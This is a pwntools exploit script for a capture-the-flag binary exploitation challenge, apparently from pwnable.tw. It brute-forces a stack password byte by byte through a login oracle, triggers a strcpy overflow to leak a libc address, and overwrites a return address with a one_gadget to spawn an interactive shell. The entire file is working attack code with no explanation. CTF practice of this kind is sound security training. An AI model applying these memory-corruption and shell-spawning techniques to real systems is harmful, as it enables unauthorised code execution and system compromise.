#!/usr/bin/env python3
from pwn import *

# p = remote("chall.pwnable.tw", "10205")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="debug")
p = elf.process()
# gdb.attach(
#     p,
#     """
#     breakrva 0xFC1
#     breakrva 0x102B
# """,
# )


def login(user_password):
    print(p.recvuntil(b">> "))
    p.send(b"1" + b"0" * 15)
    print(p.recvuntil(b"passowrd :"))
    p.send(user_password)
    response = p.recvuntil(b"!\n")
    return response


def exit_():
    print(p.recvuntil(b">> "))
    p.send(b"2" + b"0" * 15)
    return


def copy_user_data(user_data):
    print(p.recvuntil(b">> "))
    p.send(b"3" + b"0" * 15)
    print(p.recvuntil(b"Copy :"))
    p.send(user_data)
    return


def get_value_in_stack(pl, len):
    result = pl
    for sz in range(len):
        for i in range(1, 256):
            payload = result + p8(i) + p8(0)
            recv = login(payload)
            if recv == b"Login Success !\n":
                log.info("Find character: " + str(p8(i)))
                result += p8(i)
                # Logout = Login success + Login
                print(p.recvuntil(b">> "))
                p.send(b"1" + b"0" * 15)
                break
    return result


password = get_value_in_stack(b"", 16)
pass_global = password
log.info("Password global is: " + str(password))
payload = b"A" * 0x48
print(
    login(payload)
)  # login fail => fill all NULL byte to A => strcpy() => copy overflow
print(login(password + b"\x0a"))  # login success
data = b""
data += b"B" * 32
copy_user_data(data)
# Logout = Login success + Login
print(p.recvuntil(b">> "))
p.send(b"1" + b"0" * 15)

########### LEAK LIBC ###########
password = get_value_in_stack(b"A" * 8, 8)
log.info("Password stack is: " + str(password))
leak = password[8:].ljust(8, b"\x00")
libc.address = u64(leak) - 0x78439
one_gadget = libc.address + 0xF0567
log.info("LIBC base address: " + hex(libc.address))
log.info("one_gadget:        " + hex(one_gadget))
########### CODE EXECUTE ###########
payload = b""
payload += b"A" * 0x40
payload += pass_global
payload += b"B" * 0x18
payload += p64(one_gadget)  # canary global is pass_global in mmap
print(login(payload))  # login fail setup stack has one_gadget
print(login(password + b"\x0a"))  # login success
data = b""
data += b"B" * 32
copy_user_data(data)  # copy data overwrite return main => one_gadget
exit_()

p.interactive()
